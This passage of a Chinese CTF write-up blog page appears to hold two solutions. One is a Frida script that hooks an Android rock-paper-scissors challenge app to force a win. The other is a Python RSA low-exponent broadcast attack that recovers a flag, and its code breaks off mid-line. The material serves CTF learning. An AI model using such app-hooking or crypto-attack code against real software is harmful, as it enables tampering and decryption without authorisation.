+<h3 id="如该题使用自己编写的脚本请详细写出，不允许截图"><a href="#如该题使用自己编写的脚本请详细写出，不允许截图" class="headerlink" title="如该题使用自己编写的脚本请详细写出，不允许截图"></a><strong>如该题使用自己编写的脚本请详细写出，不允许截图</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|<span class="keyword">import</span> frida, sys&lt;br&gt;&lt;br&gt;&lt;br&gt;<span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span>&lt;br&gt;<span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:&lt;br&gt;print(<span class="string">&quot;[/i][i] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))&lt;br&gt;<span class="keyword">else</span>:&lt;br&gt;print(message)&lt;br&gt;&lt;br&gt;&lt;br&gt;jscode = <span class="string">&quot;&quot;&quot;&lt;br&gt;Java.perform(function () &#123;&lt;br&gt;var MainActivity = Java.use(&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;);&lt;br&gt;//开始hook onClick方法  需要注意这个function是传参数的  所以我们hook时别忘了&lt;br&gt;//public void onClick(View paramView)&#123;&#125;&lt;br&gt;MainActivity.onClick.implementation = function (v) &#123;&lt;br&gt;this.onClick(v);&lt;br&gt;//修改m，n的值&lt;br&gt;this.m.value = 0;&lt;br&gt;this.n.value = 1;&lt;br&gt;this.cnt.value = 999;&lt;br&gt;send(&quot;Success!&quot;)&lt;br&gt;&#125;&lt;br&gt;&#125;);&lt;br&gt;&quot;&quot;&quot;</span>&lt;br&gt;&lt;br&gt;process = frida.get_usb_device().attach(<span class="string">&#x27;com.seclover.HNSW20.RPS.MainActivity&#x27;</span>)&lt;br&gt;script = process.create_script(jscode)&lt;br&gt;script.on(<span class="string">&#x27;message&#x27;</span>, on_message)&lt;br&gt;script.load()&lt;br&gt;sys.stdin.read()&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;|</span><br><span class="line">|:----|</span><br></pre></td></tr></table></figure>
+
+
+<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-980984-1-1.html">https://www.52pojie.cn/thread-980984-1-1.html</a></p>
+<p>flag值与例题结果一样，107749</p>
+<p>flag{107749}</p>
+<h3 id="flag值：-8"><a href="#flag值：-8" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p>flag{107749}</p>
+<h3 id="题目十-密码2"><a href="#题目十-密码2" class="headerlink" title="题目十 密码2"></a>题目十 密码2</h3><h3 id="操作内容：-9"><a href="#操作内容：-9" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><p><strong>低指数广播攻击，fuzz e即可，e为17</strong></p>
+<h3 id="如该题使用自己编写的脚本请详细写出，不允许截图-1"><a href="#如该题使用自己编写的脚本请详细写出，不允许截图-1" class="headerlink" title="如该题使用自己编写的脚本请详细写出，不允许截图"></a><strong>如该题使用自己编写的脚本请详细写出，不允许截图</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|<span class="comment"># coding:utf8&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;from struct import pack,unpack&lt;br&gt;import zlib&lt;br&gt;import gmpy&lt;br&gt;def my_parse_number(number):&lt;br&gt;string = &quot;%x&quot; % number&lt;br&gt;#if len(string) != 64:&lt;br&gt;#    return &quot;&quot;&lt;br&gt;erg = []&lt;br&gt;while string != &#x27;&#x27;:&lt;br&gt;erg = erg + [chr(int(string[:2], 16))]&lt;br&gt;string = string[2:]&lt;br&gt;return &#x27;&#x27;.join(erg)&lt;br&gt;def extended_gcd(a, b):&lt;br&gt;x,y = 0, 1&lt;br&gt;lastx, lasty = 1, 0&lt;br&gt;while b:&lt;br&gt;a, (q, b) = b, divmod(a,b)&lt;br&gt;x, lastx = lastx-q*x, x&lt;br&gt;y, lasty = lasty-q*y, y&lt;br&gt;return (lastx, lasty, a)&lt;br&gt;def chinese_remainder_theorem(items):&lt;br&gt;N = 1&lt;br&gt;for a, n in items:&lt;br&gt;N *= n&lt;br&gt;result = 0&lt;br&gt;for a, n in items:&lt;br&gt;m = N/n&lt;br&gt;r, s, d = extended_gcd(n, m)&lt;br&gt;if d != 1:&lt;br&gt;N=N/n&lt;br&gt;continue&lt;br&gt;#raise &quot;Input not pairwise co-prime&quot;&lt;br&gt;result += a*s*m&lt;br&gt;return result % N, N&lt;br&gt;sessions=[&#123;&quot;c&quot;: 399010311121182943332309121114907411971005715655147896283369909476319473320142906797174433944197736682155228613837419252518602898442959789436466058872795204684719139465569382123104599556182756881512146887835901762524124952169928552088784468883025949156497960737022461897943895387142452146896439885966442758514883551398180828108448038344602784548819521285900170439253491829051725879130937677485144773782521693714498513283707353421186155236088813956052327129437629781022749262691591903818002745150640452705864306967771312436295009214557351255495381997105698411916814556536780279272815368148780203872635230392276897038561029968066298918693863362128071013792150689063207647118900886716782643660458005277167365424238794827411411025963471035659129582133847548362840024006275626160743108434783501160707247644258474071101048981371157536016841319724905482389910167999437472868380967163152370362239187926424917469145689563508506504834309075169219014250408812927354102861156064165623878898346687465296913386550602835135798632531680549909595951180893284332783411347133761580603793979970749905619763806933044555810234621000823825742812412350701424826572434253481700878717477193917096525871323813383655618357256914271825408980286254757657357995428, &quot;e&quot;: 17, &quot;n&quot;: 512485683379248627994222054928198152386318092644738180381554991475217377796405434854335056277622930547863024818767444598344410114539577997600760963632431418175495524212085227342236317690282303579871792604136978688849603906940046044534323144974053231416767418730793910263975433053461456721073431678088001273173284389468140530700307609776388997865772839512574327150259671379170026613490736333987026453811040095250243133527257805577313715212812958664333627735599163789040400505627822241159031720604542905728505522971011717666817345682281260608494735673864681250466412331593958894961131488445737536608944832487664399026112772867107087511943463538583457683579491879673641747689921593966314187930608676512863996255918764250565309330970516261788076369420228272626436321005067854817412234934831868982242339922158712560874614372107706079567173989259456857608363761805364620698478353230772690734471510134342068390134954906482464260622773680007027270240927217704723404590378763918240935998163799908756686555902792898116295063931404222813003278812035337906714468974195245694839181751219111401835806870499348487733491946647101567421316709805465910092315582508830042739317183125257526385847182925549204858279744905286118241383712008804714524959337&#125;,&lt;br&gt;&#123;&quot;c&quot;: 101679127888134323725416317100411720344826429929601328830868924222029861957243313130888629593943146715504722159868347829741654002116628427240384129016395510386411083515704260057559942172196997688477611541379008440315525316323378006679145918547369295922501238705223385759650387660754808143678545678441899153341228089669541301309154208551196055571665128996579361850190451835989886402761079553669245333442973834901750807859208019800931394134333884538829836559098119575423601453695242340711462656301014871141326221684472998453644674700574750611088468850059788694559149584998461969466200699430608777201007485329143552935271042350737207244773742158476032266489948431865071820745289852064304693461790424825326755826807490144386639668870704391714183649200687936642883542238703444082716114345750431099371235795680332396127429200259296001455589068681502453198015842837674520962582234472173147801727327037498300172851794008303961739725055356570920954996102811127534547751755606626494829801001521950432984882492261314920320540574998939744987184277444447882158088666360204231746334686511237233889476914338775126672202451100099836815620060273259496385106193137702971000898173496712086672858552829708543458356018009228876954328125176399940266486721, &quot;e&quot;: 17, &quot;n&quot;: 438455129905663326510217996453387937818265147158140912081178396743766705601124940665790932344481155400002301338515524231925714648114810219744906401692738457749458278151114387635536422652494466839733126044697474681703619367177810933835403243322075569780826658879869369073520408208881042059373788457691248620041363036256053901332732025192473513880966852569324181325637113811528881626784815652329195878816996045400785780863488097039442217416113657576307367610903230358079374901165790819244990843302685212147937153498655927622235924092330572523305629875231791404715651959183795358420179448279473775095313467638399477146757229070378632818776284346057352441718601252186467300865188809011881157659965626389442897514625454445586427853274594179142076630186758618951856854369899214565996874415367745532324528369058533990486031307221691495860169756892482038169396339092890711719474815240465100920233523155578622866773601776749758630566368939795717596554340628161945827353855540096690670439478394005656412231410467731001387527736194221724672706430756234754940822630104576940365000003870106656376805817265622018226286424874849207544941467791006032204338343828474870841718078157179104550873232976483975616382329979719134670083763882419066043745801&#125;,&lt;br&gt;&#123;&quot;c&quot;: 651772959894870840060102038649718098624287975188831353563157895211464117397354692694376307356217104809294356436693017232734414966073515715756220710870282877518135284377272355100684336075930019293411882322079560643529612235963044721844611100622244718471536231327233428643853698908853467079122167042327498402688154226515102711290801517703393081695874935492231825031203363534068625173045722223997882474274748963849884733327551858142505525087203555003800843026732158720251038619039816119396261158977354910621299476774407868591073821412845260844364621190213250892034844436195591940833748984393882432317958987741676458005543046381494570625865553127054568200356516586531928435872450053173532081370638426771798393956893679060639774311468035158208104718372121197462041463810903719442698671063036585602918806277123795224127059383077780909672382158306786154051753779666264201462236110658367733033404001181979613839663302066116787817088037203018689704591027311041019288748853090272606431612223021609997420842480765936764638248845753574667339942415336226419163132243409610852241935411558278958551060715644054460732821982619702657854190398281165478586242902687379449741828444267651003458264204219235283795584568034971205824995190606412406743814912, &quot;e&quot;: 17, &quot;n&quot;: 653315011935722683633899239971517941619349225695222088452194012082260326313201677835660945384275485145096065789222102748796071121711741203243670414338927148826702659529852592126552866279897276172924949211665542075745606262930965969289469269385301071552633342358778736510473222632405762525274716680890233538863243345692088160380126514797731426532170556602864402270537622591136334016473986479380886333915960074299602274671326676436465721122648878937456119562883070126768308182048342065999178801029549307888585963509968312202636585782857004099050511100978623830631609264692400949699741726049139455818499378351117228903547409337889830316549423121620369033893579169220786264356102811922557390482838303383978852873130668081323828348612838822334030273451283626768826170742066900163715681536233509267601661429117260438377187730730034557272078251624627747748768164927882629463582925338671073691854448141606348848569385399779605558939845122283956988301029392645516848789335435999529269974727866199089608234196347034929836500632922152689344010813924445789115346540480520677473336451000106471051448922245859528982264117288034012176740729039917085047680314285043383807860886975328022081757231586996665711685759320301324337611554984459865268735881&#125;]&lt;br&gt;data  = []&lt;br&gt;for session in sessions:&lt;br&gt;e=session[&#x27;e&#x27;]&lt;br&gt;n=session[&#x27;n&#x27;]&lt;br&gt;msg=session[&#x27;c&#x27;]&lt;br&gt;data = data + [(msg, n)]&lt;br&gt;print &quot;Please wait, performing CRT&quot;&lt;br&gt;x, n = chinese_remainder_theorem(data)&lt;br&gt;e=session[&#x27;e&#x27;]&lt;br&gt;realnum = gmpy.mpz(x).root(e)[0].digits()&lt;br&gt;print my_parse_number(int(realnum&lt;br&gt;![图片](https://uploader.shimo.im/f/y5AUhijDtSW7b2oG.png!thumbnail)&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;|</span></span><br><span class="line">|:----|</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag值：-9"><a href="#flag值：-9" class="headerlink" title="flag值："></a><strong>flag值：</strong></h3><p>flag{8c17fb02684fa73e6a296a89b63b56bf}</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lg-showtime</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
